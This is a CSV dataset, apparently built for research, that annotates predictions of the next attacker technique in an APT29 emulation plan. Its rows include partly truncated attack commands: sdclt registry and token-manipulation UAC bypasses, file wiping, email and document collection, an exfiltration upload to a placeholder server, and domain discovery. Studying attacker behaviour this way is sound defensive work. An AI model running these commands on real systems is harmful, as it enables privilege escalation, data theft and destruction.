annotation_id,sample_id,source_org,plan_id,scenario_id,prefix_len,state,true_label,top1_pred,true_rank,current_access_context,exhausted_action_constraint,next_target_artifact,next_micro_verb,label_confidence,annotation_notes,ann_num,matched_yaml_pos_0based,matched_suffix_len,prefix_seq_len,matched_step_idx,matched_technique_attack_id,matched_parent_tid,matched_technique_name,matched_description,matched_command_summary,alignment_ok
ms_011,apt29::unknown::53,apt29,apt29,unknown,53,T1036 T1059 T1119 T1016 T1033 T1041 T1057 T1007 T1082 T1069 T1087 T1012 T1036 T1134 T1548 T1112 T1055 T1036 T1018 T1016 T1057 T1070 T1082 T1049 T1003 T1547 T1134 T1003 T1134 T1081 T1552 T1036 T1113 T1115 T1056 T1041 T1105 T1134 T1053 T1134 T1018 T1059 T1083 T1134 T1105 T1113 T1083 T1059 T1041 T1070 T1529 T1070 T1037,T1204,T1021,179,internal_host_access,user_execution_path_not_established,user_execution_channel,trigger,human_verified,human_revised_v1,11,58,10,53,59,T1204.002,T1204,User Execution: Malicious File,Execute PowerShell collection command to collect and compress files of specific extensions.,"Set-Location -Path ""C:\Users\#{profile_user_day2}\Desktop""; if(Test-Path -LiteralPath ""$env:appdata\Microsoft\kxwn.lock""){ Remove-Item ""$env:appdata\Microsoft\kxwn.lock"" -Force; Write-Host ""Removed old kxwn.lock file""...",1
ms_012,apt29::unknown::69,apt29,apt29,unknown,69,T1036 T1059 T1119 T1016 T1033 T1041 T1057 T1007 T1082 T1069 T1087 T1012 T1036 T1134 T1548 T1112 T1055 T1036 T1018 T1016 T1057 T1070 T1082 T1049 T1003 T1547 T1134 T1003 T1134 T1081 T1552 T1036 T1113 T1115 T1056 T1041 T1105 T1134 T1053 T1134 T1018 T1059 T1083 T1134 T1105 T1113 T1083 T1059 T1041 T1070 T1529 T1070 T1037 T1204 T1070 T1518 T1082 T1033 T1057 T1134 T1003 T1546 T1018 T1033 T1028 T1105 T1114 T1005 T1537,T1561,T1021,172,internal_host_access,impact_path_not_established,host_availability,disrupt,human_verified,human_revised_v1,12,76,4,69,77,T1561.001,T1561,Disk Wipe: Disk Content Wipe,Securely delete previously staged files.,". .\wipe.ps1; wipe ""m.exe""; wipe ""C:\Windows\Temp\WindowsParentalControlMigration.tmp""; wipe ""C:\Windows\Temp\WindowsParentalControlMigration\MITRE-ATTACK-EVALS.HTML"";",1
ms_013,apt29::unknown::66,apt29,apt29,unknown,66,T1036 T1059 T1119 T1016 T1033 T1041 T1057 T1007 T1082 T1069 T1087 T1012 T1036 T1134 T1548 T1112 T1055 T1036 T1018 T1016 T1057 T1070 T1082 T1049 T1003 T1547 T1134 T1003 T1134 T1081 T1552 T1036 T1113 T1115 T1056 T1041 T1105 T1134 T1053 T1134 T1018 T1059 T1083 T1134 T1105 T1113 T1083 T1059 T1041 T1070 T1529 T1070 T1037 T1204 T1070 T1518 T1082 T1033 T1057 T1134 T1003 T1546 T1018 T1033 T1028 T1105,T1114,T1021,159,internal_host_access,collection_target_not_identified,mailbox_data,collect,human_verified,human_revised_v1,13,73,1,66,74,T1114.001,T1114,Email Collection: Local Email Collection,Perform e-mail collection from custom PowerShell module.,". .\stepSeventeen_email.ps1; Write-Host ""Emails Collected"";",1
ms_014,apt29::unknown::59,apt29,apt29,unknown,59,T1036 T1059 T1119 T1016 T1033 T1041 T1057 T1007 T1082 T1069 T1087 T1012 T1036 T1134 T1548 T1112 T1055 T1036 T1018 T1016 T1057 T1070 T1082 T1049 T1003 T1547 T1134 T1003 T1134 T1081 T1552 T1036 T1113 T1115 T1056 T1041 T1105 T1134 T1053 T1134 T1018 T1059 T1083 T1134 T1105 T1113 T1083 T1059 T1041 T1070 T1529 T1070 T1037 T1204 T1070 T1518 T1082 T1033 T1057,T1134,T1021,155,valid_user_context,privilege_context_insufficient,access_token_context,impersonate,human_verified,human_revised_v1,14,66,3,59,67,T1134.002,T1134,Access Token Manipulation: Create Process with Token,Invoke UAC bypass sdctl,. .\stepFourteen_bypassUAC.ps1; bypass;,1
ms_015,apt29::unknown::43,apt29,apt29,unknown,43,T1036 T1059 T1119 T1016 T1033 T1041 T1057 T1007 T1082 T1069 T1087 T1012 T1036 T1134 T1548 T1112 T1055 T1036 T1018 T1016 T1057 T1070 T1082 T1049 T1003 T1547 T1134 T1003 T1134 T1081 T1552 T1036 T1113 T1115 T1056 T1041 T1105 T1134 T1053 T1134 T1018 T1059 T1083,T1134,T1021,155,valid_user_context,privilege_context_insufficient,access_token_context,impersonate,human_verified,human_revised_v1,15,20,0,43,21,T1134.001,T1134,Access Token Manipulation: Token Impersonation/Theft,"A UAC bypass technique is executed to steal the token of an existing high-integrity process and launch a new, high-integrity RAT with limited functionality.",Import-Module .\Invoke-BypassUACTokenManipulation.ps1 -Verbose -Force; Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force; $pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(...,1
ms_016,apt29::unknown::67,apt29,apt29,unknown,67,T1036 T1059 T1119 T1016 T1033 T1041 T1057 T1007 T1082 T1069 T1087 T1012 T1036 T1134 T1548 T1112 T1055 T1036 T1018 T1016 T1057 T1070 T1082 T1049 T1003 T1547 T1134 T1003 T1134 T1081 T1552 T1036 T1113 T1115 T1056 T1041 T1105 T1134 T1053 T1134 T1018 T1059 T1083 T1134 T1105 T1113 T1083 T1059 T1041 T1070 T1529 T1070 T1037 T1204 T1070 T1518 T1082 T1033 T1057 T1134 T1003 T1546 T1018 T1033 T1028 T1105 T1114,T1005,T1021,142,internal_host_access,collection_target_not_identified,local_file_data,collect,human_verified,human_revised_v1,16,74,2,67,75,T1005,T1005,Data from Local System,Collect a specific document from a target machine.,"try{ if (!(test-path -path ""C:\Windows\Temp\WindowsParentalControlMigration"" -ErrorAction Stop)) { New-Item -Path ""C:\Windows\temp\"" -Name ""WindowsParentalControlMigration"" -ItemType ""directory"" -force; } } catch { wr...",1
ms_017,apt29::unknown::11,apt29,apt29,unknown,11,T1036 T1059 T1119 T1016 T1033 T1041 T1057 T1007 T1082 T1069 T1087,T1012,T1570,63,post_compromise_discovery,environment_not_enumerated,system_configuration_store,query,human_verified,human_revised_v1,17,18,1,11,19,T1012,T1012,Query Registry,The reg utility is executed via cmd to enumerate a specific Registry key associated with local system policies to ensure that the user will not be prompted for credentials when elevating permissions.,reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System,1
ms_018,apt29::unknown::19,apt29,apt29,unknown,19,T1036 T1059 T1119 T1016 T1033 T1041 T1057 T1007 T1082 T1069 T1087 T1012 T1036 T1134 T1548 T1112 T1055 T1036 T1018,T1016,T1036,59,post_compromise_discovery,environment_not_enumerated,network_configuration,enumerate,human_verified,human_revised_v1,18,27,1,19,28,T1016,T1016,System Network Configuration Discovery,The netsh utility is executed via cmd to enumerate local firewall configuration information.,netsh advfirewall show allprofiles,1
ms_019,apt29::unknown::18,apt29,apt29,unknown,18,T1036 T1059 T1119 T1016 T1033 T1041 T1057 T1007 T1082 T1069 T1087 T1012 T1036 T1134 T1548 T1112 T1055 T1036,T1018,T1036,49,post_compromise_discovery,remote_targets_not_identified,remote_host_list,enumerate,human_verified,human_revised_v1,19,25,8,18,26,T1018,T1018,Remote System Discovery,The net utility is executed via cmd to enumerate DCs within the domain,"cmd.exe /c net group ""Domain Controllers"" /domain",1
ms_020,apt29::unknown::12,apt29,apt29,unknown,12,T1036 T1059 T1119 T1016 T1033 T1041 T1057 T1007 T1082 T1069 T1087 T1012,T1036,T1033,26,execution_on_host,defense_evasion_path_not_established,process_or_file_identity,masquerade,human_verified,human_revised_v1,20,19,2,12,20,T1036.005,T1036,Masquerading: Match Legitimate Name or Location,Staging PNG for Lateral Movement,"$username=""#{profile_user}""; if ( $(test-path -path ""C:\Users\$username\Downloads\monkey.png"") -eq $false ) { copy-item monkey.png -Destination ""C:\Users\$username\Downloads\\"" -Force; if ($? -eq $True) { write-host ""...",1
ms_030,apt29::unknown::4,apt29,apt29,unknown,4,T1036 T1059 T1119 T1016,T1033,T1033,1,post_compromise_discovery,current_user_context_not_confirmed,user_account_context,query,human_verified,human_revised_v1,30,5,1,4,6,T1033,T1033,System Owner/User Discovery,The native echo command is executed via cmd to enumerate local environment variables associated with current user and domain.,echo %USERDOMAIN%\%USERNAME%,1
ms_031,apt29::unknown::5,apt29,apt29,unknown,5,T1036 T1059 T1119 T1016 T1033,T1041,T1570,45,internal_host_access,exfiltration_path_not_established,exfiltration_channel,exfiltrate,human_verified,human_revised_v1,31,6,2,5,7,T1041,T1041,Exfiltration Over Command and Control Channel,Copy a target file from a remote file share through the existing C2 channel,"Import-Module .\upload.ps1 -Verbose -Force; Invoke-MultipartFormDataUpload -InFile ""C:\Users\#{profile_user}\AppData\Roaming\Draft.zip"" -Uri ""#{server}/file/upload"";",1
ms_032,apt29::unknown::7,apt29,apt29,unknown,7,T1036 T1059 T1119 T1016 T1033 T1041 T1057,T1007,T1518,14,post_compromise_discovery,host_service_inventory_not_enumerated,service_inventory,enumerate,human_verified,human_revised_v1,32,9,1,7,10,T1007,T1007,System Service Discovery,The sc utility is executed via cmd to enumerate local active services.,sc query,1
ms_033,apt29::unknown::10,apt29,apt29,unknown,10,T1036 T1059 T1119 T1016 T1033 T1041 T1057 T1007 T1082 T1069,T1087,T1124,25,post_compromise_discovery,account_landscape_not_enumerated,account_inventory,enumerate,human_verified,human_revised_v1,33,16,1,10,17,T1087,T1087,Account Discovery,The net utility is executed via cmd to enumerate domain user accounts.,net user /domain,1
ms_034,apt29::unknown::14,apt29,apt29,unknown,14,T1036 T1059 T1119 T1016 T1033 T1041 T1057 T1007 T1082 T1069 T1087 T1012 T1036 T1134,T1548,T1049,87,valid_user_context,privilege_context_insufficient,privilege_boundary,elevate,human_verified,human_revised_v1,34,21,4,14,22,T1548.002,T1548,Abuse Elevation Control Mechanism: Bypass User Account Control,Modify registry values of sdclt to bypass UAC,"if (!(test-path -path $env:windir\system32\sdclt.exe)) { write-host ""[!] sdclt.exe was not found on this host.""; exit 1; } New-Item -Path HKCU:\Software\Classes -Name Folder -Force; New-Item -Path HKCU:\Software\Class...",1
ms_035,apt29::unknown::15,apt29,apt29,unknown,15,T1036 T1059 T1119 T1016 T1033 T1041 T1057 T1007 T1082 T1069 T1087 T1012 T1036 T1134 T1548,T1112,T1140,3,internal_host_access,configuration_modification_path_not_established,system_configuration_store,modify,human_verified,human_revised_v1,35,22,5,15,23,T1112,T1112,Modify Registry,Delete registry entries post-UAC bypass.,"Remove-Item -Path HKCU:\Software\Classes\Folder* -Recurse -Force; if (!(test-path -path HKCU:\Software\Classes\Folder)) { write-host ""[+] Reg keys removed!""; }",1
ms_036,apt29::unknown::20,apt29,apt29,unknown,20,T1036 T1059 T1119 T1016 T1033 T1041 T1057 T1007 T1082 T1069 T1087 T1012 T1036 T1134 T1548 T1112 T1055 T1036 T1018 T1016,T1057,T1021,42,post_compromise_discovery,running_processes_not_enumerated,process_inventory,enumerate,human_verified,human_revised_v1,36,28,2,20,29,T1057,T1057,Process Discovery,List running process on the machine via PowerShell.,$ps = get-process; write-output $ps;,1
